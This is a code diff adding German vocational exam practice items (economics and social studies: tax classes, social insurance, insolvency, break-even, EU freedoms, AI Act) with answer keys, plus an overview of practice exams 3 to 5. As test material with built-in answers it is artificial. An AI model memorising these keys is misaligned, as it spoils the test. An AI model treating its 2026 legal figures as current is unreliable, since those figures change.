+        match: {keys: ['I', 'II', 'III', 'IV', 'V', 'VI'], items: [['Ledige Entwicklerin ohne Kinder', 0], ['Alleinerziehender Vater mit einem Kind im Haushalt', 1], ['Verheiratete Projektleiterin mit deutlich höherem Einkommen als ihr Ehemann (Kombination mit V)', 2], ['Verheiratetes Paar mit etwa gleich hohem Einkommen', 3], ['Ein Kollege mit einem zweiten Arbeitsverhältnis (kein Minijob) bei einem anderen Arbeitgeber', 5]]},
+        a: ['**I** ledig, geschieden, verwitwet; **II** alleinerziehend (Entlastungsbetrag); **III** verheiratet, höheres Einkommen (Partner in **V**); **IV** verheiratet, ähnliches Einkommen (auch IV mit Faktor); **VI** zweites und weiteres Arbeitsverhältnis. Die Steuerklasse beeinflusst nur den monatlichen Lohnsteuerabzug, die endgültige Steuer ergibt sich aus der Einkommensteuererklärung.'], see: ['wiso-steuern', 'wiso-gehalt']},
+      {pts: 3, topic: 'Krankenversicherung', q: 'Unter welcher Voraussetzung kann ein Arbeitnehmer von der gesetzlichen in die **private Krankenversicherung** wechseln?',
+        mc: {o: ['Jederzeit, wenn er es möchte', 'Wenn sein regelmäßiges Jahresarbeitsentgelt die Versicherungspflichtgrenze (Jahresarbeitsentgeltgrenze) überschreitet', 'Nur wenn der Arbeitgeber zustimmt', 'Ab dem 30. Lebensjahr'], c: [1]},
+        a: ['Arbeitnehmer sind in der GKV versicherungspflichtig, bis ihr regelmäßiges Jahresarbeitsentgelt die **Jahresarbeitsentgeltgrenze** überschreitet; dann sind sie versicherungsfrei und können in die PKV wechseln oder freiwillig gesetzlich versichert bleiben. Beamte und Selbstständige sind nicht versicherungspflichtig. (Nicht verwechseln mit der niedrigeren **Beitragsbemessungsgrenze**.)'], see: ['wiso-kv']},
+      {pts: 3, topic: 'Rentenbeitrag', q: 'Ein Mitarbeiter verdient **4.200 Euro** brutto. Der Beitragssatz zur Rentenversicherung beträgt **18,6 %**. Wie hoch ist der **Arbeitgeberanteil** zur Rentenversicherung?',
+        num: {c: 390.6, tol: 0.01, unit: 'Euro'},
+        a: ['Der Beitrag wird **je zur Hälfte** getragen: 4.200 Euro x 9,3 % = **390,60 Euro**. Der Gesamtbeitrag beträgt 781,20 Euro. Das Entgelt liegt unter der Beitragsbemessungsgrenze.'], see: ['wiso-rv', 'wiso-sv']},
+      {pts: 3, topic: 'Sozialgericht', q: 'Die Krankenkasse lehnt eine Reha-Maßnahme ab, der Widerspruch bleibt erfolglos. Welches Gericht ist zuständig?',
+        mc: {o: ['Arbeitsgericht', 'Sozialgericht', 'Amtsgericht', 'Verwaltungsgericht'], c: [1]},
+        a: ['Für Streitigkeiten in Angelegenheiten der **Sozialversicherung** (Kranken-, Renten-, Unfall-, Pflege-, Arbeitslosenversicherung) und des Bürgergelds sind die **Sozialgerichte** zuständig (Instanzen: Sozialgericht, Landessozialgericht, Bundessozialgericht). Vorher ist ein **Widerspruchsverfahren** durchzuführen. Arbeitsgerichte entscheiden Streitigkeiten zwischen Arbeitgebern und Arbeitnehmern.'], see: ['wiso-sv']},
+      {pts: 3, topic: 'Bürgergeld', q: 'Wodurch unterscheidet sich das **Bürgergeld** vom Arbeitslosengeld I?',
+        mc: {o: ['Bürgergeld ist eine Versicherungsleistung aus Beiträgen.', 'Bürgergeld wird aus Steuern finanziert und setzt Hilfebedürftigkeit voraus; ALG I ist eine Versicherungsleistung ohne Bedürftigkeitsprüfung.', 'Bürgergeld bekommen nur Menschen über 55 Jahre.', 'Es gibt keinen Unterschied, nur einen neuen Namen.'], c: [1]},
+        a: ['**ALG I** (SGB III): Versicherungsleistung aus Beiträgen, Höhe abhängig vom früheren Entgelt (60/67 %), zeitlich begrenzt, keine Bedürftigkeitsprüfung. **Bürgergeld** (SGB II, Grundsicherung für Arbeitsuchende): **steuerfinanziert**, Regelbedarf plus Unterkunftskosten, nur bei **Hilfebedürftigkeit** (Einkommen und Vermögen werden geprüft).'], see: ['wiso-alv', 'wiso-staat']},
+      {pts: 4, topic: 'Urlaub in Teilzeit', q: 'Im Arbeitsvertrag sind **30 Urlaubstage** bei einer **5-Tage-Woche** vereinbart. Eine Kollegin wechselt dauerhaft in Teilzeit und arbeitet an **3 Tagen** pro Woche. Wie viele Urlaubstage hat sie nun im Jahr?',
+        num: {c: 18, tol: 0, unit: 'Tage'},
+        a: ['Umrechnung im Verhältnis der Arbeitstage: 30 / 5 x 3 = **18 Urlaubstage**. Sie hat damit ebenfalls **6 Wochen** frei (18 Tage / 3 Tage pro Woche). Die Stundenzahl pro Tag spielt für die Zahl der Tage keine Rolle.'], see: ['wiso-urlaub']},
+      {pts: 4, topic: 'Entgeltabrechnung', q: 'Bringen Sie die Positionen der Entgeltabrechnung in die richtige Reihenfolge.',
+        order: [['Bruttoentgelt (einschließlich vermögenswirksamer Leistungen des Arbeitgebers)', 1], ['Abzug von Lohnsteuer, Solidaritätszuschlag und Kirchensteuer', 2], ['Abzug der Arbeitnehmeranteile zur Sozialversicherung', 3], ['Nettoentgelt', 4], ['Abzug sonstiger Beträge (zum Beispiel Sparrate für vermögenswirksame Leistungen, Vorschuss)', 5], ['Auszahlungsbetrag', 6]],
+        a: ['**Brutto - Steuern - Sozialversicherung = Netto - sonstige Abzüge = Auszahlungsbetrag.** Steuern und Sozialabgaben werden beide vom Brutto berechnet; die Reihenfolge ihres Abzugs ist für das Netto gleichgültig, üblich ist die gezeigte. VL werden zum Brutto addiert (steuer- und beitragspflichtig) und nach dem Netto an den Anlagevertrag überwiesen.'], see: ['wiso-gehalt']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Aufgabengruppe 3: Unternehmen, Markt und Wirtschaftspolitik (41 Punkte)',
+    tasks: [
+      {pts: 3, topic: 'Genossenschaft', q: 'Mehrere Fahrradwerkstätten gründen eine **eingetragene Genossenschaft (eG)** für den gemeinsamen Einkauf von Ersatzteilen. Was kennzeichnet die eG?',
+        mc: {o: ['Ziel ist die Gewinnmaximierung für externe Kapitalgeber.', 'Ziel ist die Förderung der Mitglieder; in der Generalversammlung hat grundsätzlich jedes Mitglied eine Stimme, unabhängig von seinem Anteil.', 'Die Mitglieder haften immer unbeschränkt mit ihrem Privatvermögen.', 'Eine eG braucht mindestens 25.000 Euro Stammkapital.'], c: [1]},
+        a: ['eG: **Förderzweck** (wirtschaftliche Förderung der Mitglieder), mindestens **3 Mitglieder**, **ein Mitglied, eine Stimme** (Kopfprinzip), Organe Vorstand, Aufsichtsrat (ab 21 Mitgliedern) und Generalversammlung, Haftung grundsätzlich auf das Genossenschaftsvermögen beschränkt (Nachschusspflicht nach Satzung). Kein festes Mindestkapital. Beispiele: Volksbanken, Wohnungsgenossenschaften, DATEV.'], see: ['wiso-unternehmen']},
+      {pts: 3, topic: 'Insolvenz', q: 'Der Geschäftsführer einer GmbH stellt fest, dass sie **zahlungsunfähig** ist. Was muss er tun?',
+        mc: {o: ['Er kann abwarten, bis ein Gläubiger klagt.', 'Er muss ohne schuldhaftes Zögern, spätestens innerhalb von drei Wochen, einen Insolvenzantrag beim Insolvenzgericht stellen.', 'Er muss nur die Gesellschafter informieren, die über einen Antrag entscheiden.', 'Er muss den Betriebsrat um Zustimmung zu einem Insolvenzantrag bitten.'], c: [1]},
+        a: ['§ 15a InsO: **Antragspflicht** bei Zahlungsunfähigkeit **spätestens nach 3 Wochen**, bei Überschuldung spätestens nach **6 Wochen**. Wer den Antrag verschleppt, macht sich **strafbar** und haftet persönlich. Zuständig ist das **Amtsgericht als Insolvenzgericht**; Ziel ist die gemeinsame Befriedigung der Gläubiger oder die Sanierung.'], see: ['wiso-unternehmen']},
+      {pts: 4, topic: 'Konjunkturindikatoren', q: 'Ordnen Sie die Kennzahlen der passenden Art von Konjunkturindikator zu.',
+        match: {keys: ['Frühindikator', 'Präsenzindikator', 'Spätindikator'], items: [['ifo-Geschäftsklimaindex', 0], ['Auftragseingänge in der Industrie', 0], ['Industrieproduktion und Bruttoinlandsprodukt', 1], ['Arbeitslosenquote', 2], ['Inflationsrate (Verbraucherpreise)', 2], ['Kapazitätsauslastung', 1]]},
+        a: ['**Frühindikatoren** laufen der Konjunktur voraus (Erwartungen, Aufträge, Baugenehmigungen, Aktienkurse). **Präsenzindikatoren** zeigen die aktuelle Lage (Produktion, BIP, Auslastung). **Spätindikatoren** reagieren verzögert (Arbeitsmarkt, Preise, Löhne): Unternehmen stellen erst ein, wenn der Aufschwung sicher ist.'], see: ['wiso-konjunktur']},
+      {pts: 3, topic: 'Fiskalpolitik', q: 'Die Wirtschaft befindet sich in einer **Rezession**. Welche Maßnahme entspricht einer **antizyklischen Fiskalpolitik** des Staates?',
+        mc: {o: ['Staatsausgaben kürzen und Steuern erhöhen', 'Staatsausgaben erhöhen (zum Beispiel Investitionen in Radwege und Digitalisierung) und Steuern senken', 'Den Leitzins erhöhen', 'Löhne gesetzlich einfrieren'], c: [1]},
+        a: ['**Antizyklisch** (Keynes): im Abschwung **Nachfrage stärken** durch höhere Staatsausgaben, Steuersenkungen, Investitionsprogramme (auch über Kredite), im Boom zurückhalten und Schulden tilgen. Den **Leitzins** steuert die **EZB** (Geldpolitik), nicht der Staat.'], see: ['wiso-konjunktur', 'wiso-staat']},
+      {pts: 4, topic: 'Break-even', q: 'VeloCity rechnet für ein neues Stadtviertel mit **Fixkosten von 120.000 Euro** im Jahr. Jede Ausleihe bringt durchschnittlich **2,50 Euro** und verursacht **0,90 Euro** variable Kosten. Ab wie vielen Ausleihen pro Jahr ist das Viertel kostendeckend (Break-even-Menge)?',
+        ctx: [['chart', {kind: 'line', w: 720, h: 300, labels: ['0', '25', '50', '75', '100', '125'], series: [{n: 'Erlöse', d: [0, 62500, 125000, 187500, 250000, 312500], k: 'ok'}, {n: 'Gesamtkosten', d: [120000, 142500, 165000, 187500, 210000, 232500], k: 'bad'}], ymax: 320000, yl: 'Euro pro Jahr', cap: 'Waagerecht: Ausleihen pro Jahr in Tausend'}]],
+        num: {c: 75000, tol: 0, unit: 'Ausleihen'},
+        a: ['**Deckungsbeitrag je Ausleihe** = 2,50 - 0,90 = 1,60 Euro. **Break-even-Menge** = Fixkosten / Stückdeckungsbeitrag = 120.000 / 1,60 = **75.000 Ausleihen**. Im Diagramm schneiden sich Erlös- und Kostengerade genau dort; darüber entsteht Gewinn, darunter Verlust.'], see: ['ps-kalkulation', 'wiso-kennzahlen']},
+      {pts: 3, topic: 'Deckungsbeitrag', q: 'Was gibt der **Stückdeckungsbeitrag** an?',
+        mc: {o: ['Den Gewinn je verkauftem Stück nach Abzug aller Kosten', 'Den Betrag je Stück, der nach Abzug der variablen Kosten vom Preis zur Deckung der Fixkosten (und darüber hinaus als Gewinn) bleibt', 'Die Summe aus fixen und variablen Kosten je Stück', 'Den Anteil der Fixkosten an den Gesamtkosten'], c: [1]},
+        a: ['**Stückdeckungsbeitrag = Preis - variable Stückkosten.** Er zeigt, wie viel jede Einheit zur Deckung der Fixkosten beiträgt. Kurzfristig lohnt sich ein Zusatzauftrag schon, wenn sein Deckungsbeitrag positiv ist (Preisuntergrenze = variable Kosten).'], see: ['ps-kalkulation']},
+      {pts: 4, topic: 'Zusammenschlüsse', q: 'Ordnen Sie die Übernahmen durch VeloCity der Richtung des Zusammenschlusses zu.',
+        match: {keys: ['horizontal', 'vertikal', 'diagonal (konglomerat)'], items: [['VeloCity übernimmt einen konkurrierenden E-Scooter-Verleih in Leipzig.', 0], ['VeloCity kauft den Hersteller seiner smarten Schlösser.', 1], ['VeloCity beteiligt sich an einer Versicherung.', 2], ['VeloCity übernimmt die Werkstattkette, die bisher die Räder wartet.', 1]]},
+        a: ['**Horizontal**: gleiche Wirtschaftsstufe und Branche (Marktmacht, Synergien). **Vertikal**: vor- oder nachgelagerte Stufe (Zulieferer = rückwärts, Absatz = vorwärts; Sicherung von Beschaffung und Qualität). **Diagonal / konglomerat**: branchenfremd (Risikostreuung). Größere Zusammenschlüsse prüft das Bundeskartellamt (Fusionskontrolle).'], see: ['wiso-kooperation']},
+      {pts: 4, topic: 'EU-Binnenmarkt', q: 'Welche gehören zu den **vier Grundfreiheiten** des EU-Binnenmarkts? Kreuzen Sie **zwei** Antworten an.',
+        mc: {o: ['Freier Dienstleistungsverkehr', 'Freie Wahl der Sozialversicherung', 'Freier Kapital- und Zahlungsverkehr', 'Einheitliche Einkommensteuer in allen Staaten', 'Freie Wahl des Wohnsitzes für Unternehmen ohne Steuerpflicht'], c: [0, 2]},
+        a: ['Die vier Grundfreiheiten: **freier Warenverkehr**, **Personenfreizügigkeit** (Arbeitnehmer, Niederlassung), **freier Dienstleistungsverkehr** und **freier Kapital- und Zahlungsverkehr**. Steuern und Sozialversicherung sind weitgehend national geregelt.'], see: ['wiso-eu']},
+      {pts: 3, topic: 'Globalisierung', q: 'Welche Aussage beschreibt ein **Risiko der Globalisierung** für Unternehmen wie VeloCity?',
+        mc: {o: ['Größere Absatzmärkte', 'Abhängigkeit von internationalen Lieferketten, zum Beispiel bei Chips für die Schlösser', 'Günstigere Beschaffung durch weltweiten Wettbewerb', 'Zugang zu Fachkräften aus dem Ausland'], c: [1]},
+        a: ['Chancen: neue Märkte, günstigere Beschaffung, Spezialisierung, Fachkräfte. Risiken: **Lieferkettenabhängigkeit** (Engpässe, Krisen), verschärfter Wettbewerb, Wechselkursrisiken, Verlagerung von Arbeitsplätzen, Sozial- und Umweltdumping (daher Lieferkettengesetz).'], see: ['wiso-eu', 'wiso-nachhaltigkeit']},
+      {pts: 3, topic: 'Demografischer Wandel', q: 'Welche Folge des **demografischen Wandels** betrifft die Saxon Apps GmbH unmittelbar?',
+        mc: {o: ['Sinkende Rentenausgaben', 'Fachkräftemangel durch weniger junge Erwerbstätige; Wissenssicherung und Ausbildung werden wichtiger', 'Mehr Bewerbungen pro Ausbildungsplatz', 'Sinkendes Durchschnittsalter der Belegschaft'], c: [1]},
+        a: ['Weniger Geburten und höhere Lebenserwartung führen zu einer **alternden Bevölkerung**: Fachkräftemangel, älter werdende Belegschaften, steigende Sozialausgaben. Maßnahmen: eigene Ausbildung, Weiterbildung, altersgerechte Arbeitsplätze, Wissensmanagement, Zuwanderung von Fachkräften, Vereinbarkeit von Familie und Beruf.'], see: ['wiso-demografie']},
+      {pts: 4, topic: 'KI-Verordnung', q: 'Die Saxon Apps GmbH will eine KI einsetzen, die **Bewerbungen vorsortiert**. In welche Risikoklasse fällt dieses System nach der europäischen **KI-Verordnung (AI Act)**?',
+        mc: {o: ['Unannehmbares Risiko, das System ist verboten', 'Hohes Risiko mit Pflichten wie Risikomanagement, Datenqualität, Dokumentation und menschlicher Aufsicht', 'Begrenztes Risiko, es genügt ein Hinweis an die Bewerber', 'Minimales Risiko ohne besondere Pflichten'], c: [1]},
+        a: ['Der AI Act ist **risikobasiert**: **unannehmbar** (verboten, zum Beispiel Social Scoring durch Behörden, Emotionserkennung am Arbeitsplatz), **hoch** (unter anderem **Beschäftigung und Personalauswahl**, kritische Infrastruktur, Bildung: strenge Pflichten), **begrenzt** (Transparenzpflichten, zum Beispiel Chatbots, KI-generierte Inhalte kennzeichnen), **minimal** (zum Beispiel Spamfilter). Zusätzlich hat der Betriebsrat bei solchen Systemen Mitbestimmungsrechte.'], see: ['wiso-ki']},
+      {pts: 3, topic: 'Geschäftsfähigkeit', q: 'Ein **16-jähriger** Schülerpraktikant kauft ohne Wissen seiner Eltern ein Tablet für 600 Euro auf Raten. Wie ist der Vertrag zu beurteilen?',
+        mc: {o: ['Wirksam, weil er über 14 Jahre alt ist', 'Schwebend unwirksam; er wird erst mit Genehmigung der Eltern wirksam', 'Nichtig, weil Minderjährige keine Verträge schließen können', 'Wirksam nach dem Taschengeldparagrafen'], c: [1]},
+        a: ['Von 7 bis 17 Jahren ist man **beschränkt geschäftsfähig** (§ 106 BGB). Verträge ohne Einwilligung der gesetzlichen Vertreter sind **schwebend unwirksam** und werden mit deren **Genehmigung** wirksam (§ 108 BGB). Der **Taschengeldparagraf** (§ 110 BGB) greift nur, wenn die Leistung mit eigenen Mitteln **sofort vollständig** bewirkt wird, also nicht bei Ratenkäufen. Unter 7 Jahren: geschäftsunfähig, Erklärungen nichtig.'], see: ['wiso-vertrag']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/info-3.js
+// Übersicht der Probeprüfungen 3 bis 5 (realistischer Aufbau, gebundene WiSo, Lösungswege als Präsentation).
+AP2.add('exam-info', [
+  ['h', 'Probeprüfungen 3 bis 5: realistische Aufgabensätze'],
+  ['p', 'Die Probeprüfungen 3, 4 und 5 sind nach dem **Format der AP2 seit 2021** aufgebaut: **Deckblatt mit Bearbeitungshinweisen**, eine **Ausgangssituation** mit Unternehmensprofil, **Anlagen** (Vorgangslisten, Klassendiagramme, Tabellen mit Beispieldaten, Screenshots, Logdateien) und je **4 Handlungsschritte zu 25 Punkten**. Die Teilaufgaben verwenden die echten **Operatoren** (nennen, beschreiben, erläutern, berechnen, entwerfen) und enthalten in der Musterlösung einen **Bewertungsschlüssel**.'],
+  ['table', ['Satz', 'Unternehmen', 'Schwerpunkte'], [
+    ['**Probeprüfung 3**', 'NordLog Spedition GmbH (Lagerverwaltung)', 'Netzplan, Nutzwertanalyse, Use-Case- und Aktivitätsdiagramm, ERM und Normalisierung, Äquivalenzklassen, WLAN und 802.1X, Subnetting, IPv6, RAID; 2D-Felder, Rekursion, Polymorphie, Strategie-Muster, SQL mit Unterabfragen, JSON, Exceptions, Insertion Sort'],
+    ['**Probeprüfung 4**', 'VitaMed Nord MVZ (Terminplattform)', 'Scrum, User Stories, Burndown, Velocity, Amortisation, Klassen- und Sequenzdiagramm, Barrierefreiheit, Gesundheitsdaten, Schutzbedarf, Code-Review, DMZ, VPN, Passwort-Hashing, Verfügbarkeit; Intervall-Algorithmus, verkettete Liste, Hashtabelle, bedingte Aggregation, Transaktionen, Rechte, Interfaces'],
+    ['**Probeprüfung 5**', 'VeloCity Leipzig GmbH (Bikesharing)', 'Hybrides Vorgehen, Ressourcenkonflikt im Gantt, Kalkulation, Risiken, Lizenzen, EPK, Microservices, MQTT, Cloud und Container, KI, Kontrollflussgraph, Git und CI/CD, Routing, Logdatei-Analyse, Signaturen, Backup; Tariflogik, Fehlersuche, UML aus Code, Self-Join, NoSQL, HTML, CSV, Bitoperationen'],
+  ]],
+  ['see', ['exam3-ps', 'exam3-eua', 'exam3-wiso', 'exam4-ps', 'exam4-eua', 'exam4-wiso', 'exam5-ps', 'exam5-eua', 'exam5-wiso'], 'Direkt starten'],
+  ['h3', 'Was neu ist'],
+  ['kv', [
+    ['Gebundene WiSo', 'Wie in der echten Prüfung: Multiple Choice (eine oder mehrere richtige Antworten), Zuordnungen, Reihenfolgen und Rechenaufgaben. **Automatisch ausgewertet**, mit Erklärung zu jeder Aufgabe. "Prüfung abgeben" wertet alle Aufgaben auf einmal aus.'],
+    ['Lösungsweg als Präsentation', 'Rechen- und Modellierungsaufgaben haben einen **Schritt-für-Schritt-Lösungsweg**: Netzplan vorwärts und rückwärts, Normalisierung 1NF bis 3NF, Subnetting, Schreibtischtests, Sortierverfahren als Balkendiagramm, SQL-Auswertung Zeile für Zeile. Blättern mit Weiter/Zurück oder den Pfeiltasten.'],
+    ['Diagramme in der Lösung', 'Musterlösungen als echte Diagramme: Netzplan, Gantt, Use-Case, Aktivität, Klasse, Sequenz, ERM, EPK, Struktogramm, Kontrollflussgraph, Netzwerktopologie, DMZ, Testpyramide, Burndown, Break-even und mehr. Programmieraufgaben mit Lösungen in mehreren Sprachen.'],
+    ['Auswertung nach Themen', 'Am Ende jeder Prüfung zeigt die **Auswertung** die Punkte je Handlungsschritt und listet die **Themen, in denen du Punkte verloren hast**, sortiert nach Gewicht. Ein Klick führt zur passenden Lernseite.'],
+  ]],
+  ['h3', 'Empfohlener Lernplan'],
+  ['steps', ['**Probeprüfung 3 unter echten Bedingungen** schreiben: 90 + 90 + 60 Minuten, Uhr starten, nur Taschenrechner.', 'Ehrlich bewerten und die **Auswertung** lesen. Die drei Themen mit den meisten verlorenen Punkten auf der jeweiligen Lernseite wiederholen (Quiz und Aufgaben dort).', 'Die Lösungswege der Rechenaufgaben **Schritt für Schritt** nachvollziehen und die Aufgabe danach ohne Hilfe noch einmal lösen.', 'Nach 3 bis 4 Tagen **Probeprüfung 4**, eine Woche später **Probeprüfung 5**.', 'In der letzten Woche vor der Prüfung die schwächste Probeprüfung **zurücksetzen** und wiederholen. Ziel: in jedem Teil sicher über **67 %** (Note 3).']],
+  ['tip', 'Die Probeprüfungen 3 bis 5 überschneiden sich bewusst kaum: Zusammen mit den Probeprüfungen 1 und 2 deckst du fast alle Themen des Prüfungskatalogs ab. Rechtswerte und Beitragssätze haben den Stand 2026; prüfe kurz vor der Prüfung, ob sich etwas geändert hat.'],
 ]);
 ;
 // content/course/python/01.js
